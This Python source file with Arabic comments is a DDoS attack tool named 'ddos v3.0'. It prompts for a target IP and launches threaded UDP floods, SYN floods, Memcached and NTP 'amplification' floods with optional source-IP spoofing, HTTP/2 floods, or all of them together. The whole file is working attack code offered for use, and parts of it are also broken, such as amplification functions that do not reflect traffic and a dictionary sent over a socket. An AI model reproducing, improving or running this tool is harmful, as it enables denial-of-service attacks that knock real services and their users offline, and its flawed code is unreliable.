import socket
import threading
import random
import time
import subprocess
import sys
import os
import struct
from scapy.all import *
import ssl

# التحقق من صلاحيات root
def check_root():
    if os.name == 'nt':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.getuid() == 0

# طباعة البانر المميز
def print_banner():
    banner = r"""

            ddos v3.0 -
            Developed by : Apex  - 777 |
    """
    print(banner)

# ==================== هجمات DDoS الأساسية ====================

def advanced_udp_flood(target_ip, target_port, packet_size, stop_event):
    """هجوم UDP متطور مع تحسينات الأداء"""
    data = random._urandom(packet_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(data, (target_ip, target_port))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.close()

def advanced_tcp_flood(target_ip, target_port, packet_size, stop_event, attack_type="SYN"):
    """هجوم TCP مع خيارات متعددة (SYN, ACK, RST)"""
    data = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            if attack_type == "SYN":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect_ex((target_ip, target_port))
                s.close()
            elif attack_type == "ACK":
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.sendto(data, (target_ip, target_port))
                s.close()
            else:  # TCP العادي
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(data)
                s.close()
        except:
            pass

# ==================== هجمات التضخيم ====================

def memcached_amplification(target_ip, spoof_ip=None, stop_event=None):
    """هجوم Memcached مع تضخيم يصل لـ50,000x"""
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    while not stop_event.is_set():
        try:
            if spoof_ip:
                packet = IP(src=spoof_ip, dst=target_ip)/UDP(sport=random.randint(1024,65535), dport=11211)/payload
                send(packet, verbose=0)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, 11211))
                sock.close()
        except Exception as e:
            print(f"[!] Memcached Error: {e}")
            time.sleep(0.1)

def ntp_amplification(target_ip, stop_event):
    """هجوم NTP amplification (حتى 556x تضخيم)"""
    payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (target_ip, 123))
            sock.close()
        except:
            pass

# ==================== هجمات متقدمة ====================

def http2_flood(target_ip, target_port, stop_event):
    """هجوم HTTP/2 متطور"""
    headers = {
        ':method': 'GET',
        ':path': '/',
        ':authority': target_ip,
        ':scheme': 'https',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }

    while not stop_event.is_set():
        try:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(['h2'])
            s = socket.create_connection((target_ip, target_port))
            ss = ctx.wrap_socket(s, server_hostname=target_ip)
            ss.send(headers)
            ss.close()
        except:
            pass

# ==================== أدوات مساعدة ====================

def monitor_attack(stop_event, start_time):
    """عرض إحصائيات الهجوم"""
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        print(f"\r[+] Attack running for {int(elapsed)} seconds...", end='')
        time.sleep(1)

def check_internet():
    """فحص اتصال الإنترنت"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except:
        return False

# ==================== الواجهة الرئيسية ====================

def main():
    if not check_root():
        print("[!] This tool requires root/admin privileges!")
        sys.exit(1)

    if not check_internet():
        print("[!] No internet connection detected!")
        sys.exit(1)

    print_banner()

    try:
        target_ip = input("[+] Enter target IP: ").strip()
        target_port = int(input("[+] Enter target port (0 for ICMP/Memcached): ").strip())

        print("\nAvailable attack methods:")
        print("1. UDP Flood")
        print("2. TCP/SYN Flood")
        print("3. Memcached Amplification")
        print("4. NTP Amplification")
        print("5. HTTP/2 Flood")
        print("6. MIXED Attack (All methods)")

        choice = input("\n[+] Select attack method (1-6): ").strip()
        threads = int(input("[+] Threads count (100-1000 recommended): ").strip())
        duration = int(input("[+] Duration in seconds (0=unlimited): ").strip())

        stop_event = threading.Event()
        start_time = time.time()

        # Monitoring thread
        threading.Thread(target=monitor_attack, args=(stop_event, start_time), daemon=True).start()

        # Attack threads
        if choice == '1':
            print("\n[+] Starting UDP Flood attack...")
            for _ in range(threads):
                threading.Thread(target=advanced_udp_flood, args=(target_ip, target_port, 1024, stop_event), daemon=True).start()

        elif choice == '2':
            print("\n[+] Starting SYN Flood attack...")
            for _ in range(threads):
                threading.Thread(target=advanced_tcp_flood, args=(target_ip, target_port, 1024, stop_event, "SYN"), daemon=True).start()

        elif choice == '3':
            print("\n[+] Starting Memcached Amplification attack...")
            spoof_ip = input("[+] Spoof IP? (leave empty for no spoofing): ").strip() or None
            for _ in range(min(threads, 10)):  # Memcached doesn't need many threads
                threading.Thread(target=memcached_amplification, args=(target_ip, spoof_ip, stop_event), daemon=True).start()

        elif choice == '4':
            print("\n[+] Starting NTP Amplification attack...")
            for _ in range(min(threads, 10)):
                threading.Thread(target=ntp_amplification, args=(target_ip, stop_event), daemon=True).start()

        elif choice == '5':
            print("\n[+] Starting HTTP/2 Flood attack...")
            for _ in range(threads):
                threading.Thread(target=http2_flood, args=(target_ip, target_port or 443, stop_event), daemon=True).start()

        elif choice == '6':
            print("\n[+] Starting MIXED attack (all methods)...")
            # Distribute threads between methods
            for _ in range(threads//5):
                threading.Thread(target=advanced_udp_flood, args=(target_ip, target_port, 1024, stop_event), daemon=True).start()
                threading.Thread(target=advanced_tcp_flood, args=(target_ip, target_port, 1024, stop_event, "SYN"), daemon=True).start()
                threading.Thread(target=memcached_amplification, args=(target_ip, None, stop_event), daemon=True).start()
                threading.Thread(target=ntp_amplification, args=(target_ip, stop_event), daemon=True).start()
                threading.Thread(target=http2_flood, args=(target_ip, target_port or 443, stop_event), daemon=True).start()

        # Timer for limited duration
        if duration > 0:
            threading.Timer(duration, stop_event.set).start()

        # Wait for stop event
        while not stop_event.is_set():
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        stop_event.set()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        stop_event.set()

    print("\n[+] Attack finished successfully!")
    print("======================================")
    print("Thank you for using Ultimate Direct Beast DDoS Tool")
    print("Please use this tool responsibly and legally")
    print("======================================")

if __name__ == "__main__":
    main()
